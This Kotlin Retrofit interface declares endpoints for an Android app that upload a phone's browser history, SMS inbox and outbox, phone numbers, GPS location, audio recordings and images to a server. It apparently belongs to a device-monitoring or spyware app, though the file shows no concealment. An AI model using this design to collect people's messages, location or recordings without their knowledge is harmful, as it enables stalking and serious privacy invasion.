package api

import android.content.res.TypedArray
import io.reactivex.Observable
import mvp.model.GlobalModel
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.http.*


interface ApiService {

    @FormUrlEncoded
    @POST("api/mobileoko/addHistoryBrowser")
    fun uploadHistoryBrowser(@Header("auth_token") auth_token: String,
                             @Field("history_content") hisory_content: String

    ): Observable<GlobalModel>

    @FormUrlEncoded
    @POST("api/mobileoko/uplaodSmsInbox")
    fun uploadSmsInbox(@Header("auth_token") auth_token: String,
                       @Field("smsInbox") smsInbox: List<String>
    ): Observable<GlobalModel>

    @FormUrlEncoded
    @POST("api/mobileoko/uplaodSmsOutbox")
    fun uploadSmsOutbox(@Header("auth_token") auth_token: String,
                        @Field("outboxSms") outboxSms: List<String>
    ): Observable<GlobalModel>

    @FormUrlEncoded
    @POST("api/mobileoko/uploadPhone")
    fun uploadPhone(
            @Header("auth_token") auth_token: String,
            @Field("phone") phone: List<String>
    ): Observable<GlobalModel>

    @FormUrlEncoded
    @POST("api/mobileoko/uploadLocation")
    fun uploadLocation(@Header("auth_token") auth_token: String,
                       @Field("latitude") latitude: Double,
                       @Field("longitude") longitude: Double
    ): Observable<GlobalModel>


    //
    @Multipart
    //@Headers("Content-Type: audio/mpeg")
    @POST("/api/mobileoko/uploadRecorder")
    fun uploadRecorder(
            @Header("auth_token") auth_token: String,
            @Part file: List<MultipartBody.Part>): Observable<GlobalModel>

    @Multipart
    @POST("/api/mobileoko/uploadImages")
    fun uploadImages(@Header("auth_token") auth_token: String,
                     @Part file : List<MultipartBody.Part>): Observable<GlobalModel>



}